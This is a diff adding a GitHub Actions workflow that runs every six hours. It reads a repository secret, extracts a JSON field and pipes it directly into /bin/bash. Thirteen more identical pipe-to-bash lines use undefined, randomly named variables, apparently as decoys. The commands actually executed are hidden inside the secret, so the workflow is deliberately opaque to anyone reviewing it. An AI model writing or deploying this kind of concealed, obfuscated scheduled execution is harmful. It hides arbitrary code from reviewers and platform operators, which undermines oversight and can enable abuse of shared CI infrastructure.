@@ -1,0 +1,30 @@
+name: jiuflianyuanbenyinggaishi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiuflianyuanbenyinggaishi
+        env:
+          y66449: ${{ secrets.y66449 }}
+        run: |
+          echo $y66449 | jq -r .vyhm879 | /bin/bash
+          echo $t55960 | jq -r .tukg79297 | /bin/bash
+          echo $nbti49 | jq -r .ttqt84537 | /bin/bash
+          echo $txms99361 | jq -r .q20495 | /bin/bash
+          echo $lil36186 | jq -r .ur6 | /bin/bash
+          echo $xisk9353 | jq -r .vnzeh9948 | /bin/bash
+          echo $gha64 | jq -r .oinj286 | /bin/bash
+          echo $wcue0 | jq -r .cezsh99803 | /bin/bash
+          echo $eqxy119 | jq -r .pinyu84327 | /bin/bash
+          echo $bbx0736 | jq -r .h422 | /bin/bash
+          echo $x41 | jq -r .lnatj61091 | /bin/bash
+          echo $ifer3 | jq -r .scwk2157 | /bin/bash
+          echo $v6798 | jq -r .qf626 | /bin/bash
+          echo $d2 | jq -r .oyw993 | /bin/bash
+
